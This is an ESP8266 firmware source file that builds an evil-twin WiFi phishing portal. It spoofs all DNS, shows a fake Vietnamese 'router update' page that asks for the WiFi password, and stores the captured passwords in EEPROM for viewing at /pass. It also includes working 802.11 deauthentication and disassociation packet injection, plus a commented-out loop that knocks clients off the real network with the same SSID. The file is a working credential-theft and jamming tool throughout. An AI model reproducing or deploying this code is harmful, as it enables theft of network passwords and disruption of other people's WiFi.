// ESP8266 WiFi Captive Portal
// By 125K (github.com/125K)

// Libraries
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

/*
 * The packet has this structure:
 * 0-1:   type (C0 is deauth)
 * 2-3:   duration
 * 4-9:   receiver address (broadcast)
 * 10-15: source address
 * 16-21: BSSID
 * 22-23: sequence number
 * 24-25: reason code (1 is unspecified reason)
 */

uint8_t packet[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x01, 0x00
};

// Default SSID name
const char *SSID_NAME = "Free WiFi";

// Default main strings
#define SUBTITLE "Thông tin bộ định tuyến."
#define TITLE "Cập nhật"
#define BODY "Bộ định tuyến của bạn đã lỗi thời. Cập nhật để tiếp tục sử dụng."
#define POST_TITLE "Đang cập nhật..."
#define POST_BODY "Bộ định tuyến đang được cập nhật, làm ơn chờ quá trình cập nhật kết thúc</br>Cảm ơn."
#define PASS_TITLE "Mật khẩu"
#define CLEAR_TITLE "Đã dọn dẹp"

// Init system settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
const byte AUTHEN_TIMER = 2000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String allPass = "";
String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20;  // Location to check whether the ESP is running for the first time.
int passStart = 30;             // Starting location in EEPROM to save password.
int passEnd = passStart;        // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0, lastTickAuthen = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; Trung Trần.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>"
             + a + " :: " + t + "</title>"
                                "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                                "<style>"
             + CSS + "</style>"
                     "<meta charset=\"UTF-8\"></head>"
                     "<body><nav><b>"
             + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Nhập mật khẩu Wifi:</label>" + "<input type=password name=m></input><input type=submit value=\"Bắt đầu\"></form>" + footer();
}

String posted() {
  String pass = input("m");
  pass = "<li><b>"+currentSSID+":" + pass + "</li></b>";  // Adding password in a ordered list.
  allPass += pass;                        // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i) {
    EEPROM.write(passEnd + i, pass[i]);  // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length();  // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Quay lại chỉ mục</a></p><p><a style=\"color:blue\" href=/clear>Dọn dẹp mật khẩu</a></p></center>" + footer();
}

String ssid() {
  return header("Thay đổi SSID") + "<p>Bạn có thể thay đổi tên SSID.Sau khi ấn vào nút \"Thay đổi SSID\" bạn sẽ mất kết nối và kết nối lại với SSID mới.</p>" + "<form action=/postSSID method=post><label>Tên SSID mới:</label>" + "<input type=text name=s></input><input type=submit value=\"Thay đổi SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return newSSID;
}

String clear() {
  allPass = "";
  passEnd = passStart;  // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>Mật khẩu đã được dọn dẹp.</div></p><center><a style=\"color:blue\" href=/>Quay lại chỉ mục</a></center>" + footer();
}

void BLINK() {  // The built-in LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++) {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries) {

    wifi_set_channel(wifi_channel);

    bool sent = false;

    for (int i = 0; i < tries && !sent; i++) sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;

    return sent;
}

bool deauthDevice(uint8_t* mac, uint8_t wifi_channel) {

    bool success = false;

    memcpy(&packet[10], mac, 6);
    memcpy(&packet[16], mac, 6);

    packet[0] = 0xC0;
    if (sendPacket(packet, sizeof(packet), wifi_channel, 5)) {
        success = true;
    }

    // send disassociate frame
    packet[0] = 0xa0;

    if (sendPacket(packet, sizeof(packet), wifi_channel, 5)) {
        success = true;
    }

    return success;
}

void setup() {
  // Serial begin
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first";  // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i) {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i) {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');          // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0');  // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0') {
    allPass += char(EEPROM.read(passEnd));  // Reading the store password in EEPROM.
    passEnd++;                              // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only for HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/ssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid());
  });
  webServer.on("/postSSID", []() {
    webServer.send(HTTP_CODE, "text/html", postedSSID());
  });
  webServer.on("/pass", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();

  // Enable the built-in LED
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();

  // //Deauthen wifi
  // if ((millis() - lastTickAuthen) > AUTHEN_TIMER) {
  //   int networksListSize = WiFi.scanNetworks();
  //   Serial.println("Current SSID :"+currentSSID);
  //   for (int i = 0; i < networksListSize; i++) {      
  //     Serial.println(WiFi.SSID(i) + " " + WiFi.RSSI(i));
  //     if (WiFi.SSID(i) == currentSSID){
  //       Serial.println("This current SSID");
  //       Serial.println("Deauthen this SSID");
  //       deauthDevice(WiFi.BSSID(i), WiFi.channel(i));
  //     }
  //   }
  //   //delay(2000);
  //   lastTickAuthen = millis();
  // }

  Serial.println("");
}
